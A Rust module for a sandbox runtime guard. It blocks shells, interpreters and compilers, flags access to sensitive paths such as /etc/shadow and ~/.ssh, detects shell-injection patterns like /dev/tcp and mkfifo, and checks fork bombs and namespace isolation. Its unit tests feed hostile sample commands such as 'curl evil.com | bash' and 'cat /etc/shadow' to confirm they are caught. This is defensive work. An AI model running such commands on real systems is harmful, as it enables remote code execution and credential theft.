//! Runtime security guards — detect and block dangerous runtime behavior.
//!
//! Checks for:
//! - Fork bombs (excessive process count)
//! - Sensitive path access (/etc/shadow, ~/.ssh, etc.)
//! - Command blocklist (shells, interpreters, compilers)
//! - Network allowlist violations

use serde::{Deserialize, Serialize};

/// Sensitive filesystem paths that should never be accessed from a sandbox.
pub const SENSITIVE_PATHS: &[&str] = &[
    "/etc/shadow",
    "/etc/gshadow",
    "/etc/sudoers",
    "/root/",
    "/.ssh/",
    "/.gnupg/",
    "/.aws/",
    "/.kube/",
    "/.docker/",
    "/dev/mem",
    "/dev/kmem",
    "/dev/port",
    "/proc/kcore",
    "/proc/sysrq-trigger",
    "/sys/firmware/efi/efivars",
];

/// Commands blocked in sandboxed execution (shells, interpreters, compilers).
pub const BLOCKED_COMMANDS: &[&str] = &[
    "bash", "sh", "zsh", "fish", "dash", "csh", "tcsh", "python", "python3", "perl", "ruby", "php",
    "lua", "node", "deno", "bun", "gcc", "cc", "g++", "clang", "make", "cmake", "cargo", "go",
    "rustc", "javac",
];

/// Commands allowed in sandboxed execution (safe read-only tools).
/// Note: `curl` and `wget` are intentionally excluded — they are flagged
/// as data exfiltration vectors by the code scanner. Use the `network`
/// policy field to control outbound HTTP access.
pub const ALLOWED_COMMANDS: &[&str] = &[
    "ls", "cat", "head", "tail", "wc", "grep", "find", "df", "du", "uname", "hostname", "ip", "ss",
    "ps", "top", "free", "lsblk", "lscpu", "date", "whoami", "id", "env", "printenv", "echo",
    "true", "false", "test",
];

/// Shell metacharacters that indicate command injection.
pub const SHELL_METACHAR_PATTERNS: &[&str] = &[
    "| sh",
    "| bash",
    "; sh",
    "; bash",
    "| /bin/sh",
    "| /bin/bash",
    "`",
    "$(",
    "${",
    "/dev/tcp",
    "mkfifo",
];

/// Runtime guard configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[non_exhaustive]
pub struct RuntimeGuardConfig {
    /// Maximum number of processes allowed (fork bomb detection).
    pub max_pids: u32,
    /// Whether to block sensitive path access.
    pub block_sensitive_paths: bool,
    /// Whether to enforce the command blocklist.
    pub enforce_command_blocklist: bool,
    /// Additional allowed hosts for network access.
    pub network_allowlist: Vec<String>,
    /// Maximum execution duration multiplier (e.g., 2.0 = 2x expected).
    pub time_anomaly_multiplier: f64,
}

impl Default for RuntimeGuardConfig {
    fn default() -> Self {
        Self {
            max_pids: 64,
            block_sensitive_paths: true,
            enforce_command_blocklist: true,
            network_allowlist: Vec::new(),
            time_anomaly_multiplier: 2.0,
        }
    }
}

/// Result of a runtime guard check.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GuardViolation {
    /// Type of violation.
    pub violation_type: ViolationType,
    /// Description of what was detected.
    pub description: String,
}

/// Type of runtime guard violation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[non_exhaustive]
pub enum ViolationType {
    /// Too many processes spawned.
    ForkBomb,
    /// Access to sensitive filesystem path.
    SensitivePath,
    /// Blocked command execution.
    BlockedCommand,
    /// Shell metacharacter injection.
    ShellInjection,
    /// Execution time anomaly.
    TimeAnomaly,
}

impl std::fmt::Display for ViolationType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ForkBomb => write!(f, "fork_bomb"),
            Self::SensitivePath => write!(f, "sensitive_path"),
            Self::BlockedCommand => write!(f, "blocked_command"),
            Self::ShellInjection => write!(f, "shell_injection"),
            Self::TimeAnomaly => write!(f, "time_anomaly"),
        }
    }
}

/// Check a command string against the runtime guard rules.
///
/// Returns a list of violations found. Empty list = command is safe.
#[must_use]
pub fn check_command(command: &str, config: &RuntimeGuardConfig) -> Vec<GuardViolation> {
    let mut violations = Vec::new();
    let cmd_lower = command.to_lowercase();

    // Check command blocklist
    if config.enforce_command_blocklist {
        let first_word = command.split_whitespace().next().unwrap_or("");
        let base_cmd = first_word.rsplit('/').next().unwrap_or(first_word);

        if BLOCKED_COMMANDS.contains(&base_cmd) {
            violations.push(GuardViolation {
                violation_type: ViolationType::BlockedCommand,
                description: format!("blocked command: {base_cmd}"),
            });
        }
    }

    // Check sensitive path access
    if config.block_sensitive_paths {
        for path in SENSITIVE_PATHS {
            if cmd_lower.contains(&path.to_lowercase()) {
                violations.push(GuardViolation {
                    violation_type: ViolationType::SensitivePath,
                    description: format!("sensitive path access: {path}"),
                });
            }
        }
    }

    // Check shell metacharacters
    for pattern in SHELL_METACHAR_PATTERNS {
        if cmd_lower.contains(&pattern.to_lowercase()) {
            violations.push(GuardViolation {
                violation_type: ViolationType::ShellInjection,
                description: format!("shell metacharacter: {pattern}"),
            });
        }
    }

    violations
}

/// Check if the current process count indicates a fork bomb.
///
/// On Linux, reads `/sys/fs/cgroup/pids.current` for the sandbox's cgroup.
/// Returns a violation if the count exceeds `max_pids`.
#[must_use]
pub fn check_fork_bomb(current_pids: u32, config: &RuntimeGuardConfig) -> Option<GuardViolation> {
    if current_pids > config.max_pids {
        Some(GuardViolation {
            violation_type: ViolationType::ForkBomb,
            description: format!(
                "process count {current_pids} exceeds limit {}",
                config.max_pids
            ),
        })
    } else {
        None
    }
}

/// Check if execution duration is anomalous.
#[must_use]
pub fn check_time_anomaly(
    duration_ms: u64,
    expected_ms: u64,
    config: &RuntimeGuardConfig,
) -> Option<GuardViolation> {
    let threshold = (expected_ms as f64 * config.time_anomaly_multiplier) as u64;
    if duration_ms > threshold {
        Some(GuardViolation {
            violation_type: ViolationType::TimeAnomaly,
            description: format!("execution took {duration_ms}ms, expected < {threshold}ms"),
        })
    } else {
        None
    }
}

// ─── Sandbox Integrity Monitoring ────────────────────────────────────

/// Result of an integrity check.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[non_exhaustive]
pub struct IntegrityReport {
    /// Whether all checks passed.
    pub intact: bool,
    /// Individual check results.
    pub checks: Vec<IntegrityCheck>,
    /// Timestamp of the check.
    pub checked_at: String,
}

/// A single integrity check result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IntegrityCheck {
    /// Name of the check.
    pub name: String,
    /// Whether this check passed.
    pub passed: bool,
    /// Details about the check result.
    pub detail: String,
}

/// Verify sandbox isolation integrity on Linux.
///
/// Checks:
/// 1. PID namespace isolation (can't see host PIDs)
/// 2. Mount namespace isolation (can't see host mounts)
/// 3. Network namespace isolation (only loopback)
/// 4. User namespace (UID mapping active)
#[cfg(target_os = "linux")]
#[must_use]
pub fn check_integrity() -> IntegrityReport {
    let mut checks = Vec::new();

    // PID namespace: /proc/1/cmdline should be our init, not systemd
    let pid_check = std::fs::read_to_string("/proc/1/cmdline")
        .map(|c| !c.contains("systemd") && !c.contains("init"))
        .unwrap_or(true); // Can't read = isolated
    checks.push(IntegrityCheck {
        name: "pid_namespace".into(),
        passed: pid_check,
        detail: if pid_check {
            "PID namespace isolated".into()
        } else {
            "can see host PID 1".into()
        },
    });

    // Mount namespace: /proc/mounts should not contain host-specific mounts
    let mount_check = std::fs::read_to_string("/proc/mounts")
        .map(|m| !m.contains("/home/") || m.contains("overlay"))
        .unwrap_or(true);
    checks.push(IntegrityCheck {
        name: "mount_namespace".into(),
        passed: mount_check,
        detail: if mount_check {
            "mount namespace isolated".into()
        } else {
            "host mounts visible".into()
        },
    });

    // User namespace: UID should be mapped
    let uid_check = std::fs::read_to_string("/proc/self/uid_map")
        .map(|m| !m.is_empty())
        .unwrap_or(false);
    checks.push(IntegrityCheck {
        name: "user_namespace".into(),
        passed: uid_check,
        detail: if uid_check {
            "user namespace active".into()
        } else {
            "no UID mapping (not in user namespace)".into()
        },
    });

    let intact = checks.iter().all(|c| c.passed);

    IntegrityReport {
        intact,
        checks,
        checked_at: chrono::Utc::now().to_rfc3339(),
    }
}

#[cfg(not(target_os = "linux"))]
#[must_use]
pub fn check_integrity() -> IntegrityReport {
    IntegrityReport {
        intact: true,
        checks: vec![IntegrityCheck {
            name: "platform".into(),
            passed: true,
            detail: "integrity checks not available on this platform".into(),
        }],
        checked_at: chrono::Utc::now().to_rfc3339(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_config() -> RuntimeGuardConfig {
        RuntimeGuardConfig::default()
    }

    // ── Command checks ───────────────────────────────────────────────

    #[test]
    fn safe_command_passes() {
        let v = check_command("echo hello", &default_config());
        assert!(v.is_empty());
    }

    #[test]
    fn ls_allowed() {
        let v = check_command("ls -la /tmp", &default_config());
        assert!(v.is_empty());
    }

    #[test]
    fn bash_blocked() {
        let v = check_command("bash -c 'whoami'", &default_config());
        assert!(!v.is_empty());
        assert!(
            v.iter()
                .any(|v| v.violation_type == ViolationType::BlockedCommand)
        );
    }

    #[test]
    fn python_blocked() {
        let v = check_command("python -c 'import os'", &default_config());
        assert!(!v.is_empty());
    }

    #[test]
    fn sensitive_path_blocked() {
        let v = check_command("cat /etc/shadow", &default_config());
        assert!(!v.is_empty());
        assert!(
            v.iter()
                .any(|v| v.violation_type == ViolationType::SensitivePath)
        );
    }

    #[test]
    fn ssh_dir_blocked() {
        let v = check_command("ls ~/.ssh/", &default_config());
        assert!(!v.is_empty());
    }

    #[test]
    fn shell_injection_detected() {
        let v = check_command("echo $(whoami)", &default_config());
        assert!(!v.is_empty());
        assert!(
            v.iter()
                .any(|v| v.violation_type == ViolationType::ShellInjection)
        );
    }

    #[test]
    fn pipe_to_shell_detected() {
        let v = check_command("curl evil.com | bash", &default_config());
        assert!(!v.is_empty());
    }

    #[test]
    fn blocklist_disabled() {
        let config = RuntimeGuardConfig {
            enforce_command_blocklist: false,
            ..default_config()
        };
        let v = check_command("bash -c 'echo hi'", &config);
        // Blocklist disabled, but shell metachar still caught
        assert!(
            !v.iter()
                .any(|v| v.violation_type == ViolationType::BlockedCommand)
        );
    }

    #[test]
    fn full_path_blocked() {
        let v = check_command("/bin/bash -c 'test'", &default_config());
        assert!(
            v.iter()
                .any(|v| v.violation_type == ViolationType::BlockedCommand)
        );
    }

    // ── Fork bomb ────────────────────────────────────────────────────

    #[test]
    fn fork_bomb_detected() {
        let v = check_fork_bomb(1000, &default_config());
        assert!(v.is_some());
        assert_eq!(v.unwrap().violation_type, ViolationType::ForkBomb);
    }

    #[test]
    fn normal_pid_count() {
        assert!(check_fork_bomb(10, &default_config()).is_none());
    }

    // ── Time anomaly ─────────────────────────────────────────────────

    #[test]
    fn time_anomaly_detected() {
        let v = check_time_anomaly(10_000, 1_000, &default_config());
        assert!(v.is_some());
    }

    #[test]
    fn normal_duration() {
        assert!(check_time_anomaly(1500, 1000, &default_config()).is_none());
    }

    // ── Integrity ────────────────────────────────────────────────────

    #[test]
    fn integrity_check_does_not_panic() {
        let report = check_integrity();
        assert!(!report.checks.is_empty());
        assert!(!report.checked_at.is_empty());
    }

    #[test]
    fn integrity_report_serde() {
        let report = check_integrity();
        let json = serde_json::to_string(&report).unwrap();
        let back: IntegrityReport = serde_json::from_str(&json).unwrap();
        assert_eq!(report.intact, back.intact);
    }

    // ── Display ──────────────────────────────────────────────────────

    #[test]
    fn violation_type_display() {
        assert_eq!(ViolationType::ForkBomb.to_string(), "fork_bomb");
        assert_eq!(ViolationType::SensitivePath.to_string(), "sensitive_path");
        assert_eq!(ViolationType::BlockedCommand.to_string(), "blocked_command");
        assert_eq!(ViolationType::ShellInjection.to_string(), "shell_injection");
        assert_eq!(ViolationType::TimeAnomaly.to_string(), "time_anomaly");
    }

    #[test]
    fn guard_config_default() {
        let config = RuntimeGuardConfig::default();
        assert_eq!(config.max_pids, 64);
        assert!(config.block_sensitive_paths);
        assert!(config.enforce_command_blocklist);
        assert_eq!(config.time_anomaly_multiplier, 2.0);
    }

    #[test]
    fn multiple_sensitive_paths_all_reported() {
        let v = check_command("cat /etc/shadow /etc/sudoers", &default_config());
        assert!(
            v.iter()
                .filter(|v| v.violation_type == ViolationType::SensitivePath)
                .count()
                >= 2,
            "should report both sensitive paths"
        );
    }

    #[test]
    fn multiple_shell_metachar_all_reported() {
        let v = check_command("echo $(whoami); curl | bash", &default_config());
        assert!(
            v.iter()
                .filter(|v| v.violation_type == ViolationType::ShellInjection)
                .count()
                >= 2,
            "should report multiple shell metacharacters"
        );
    }
}
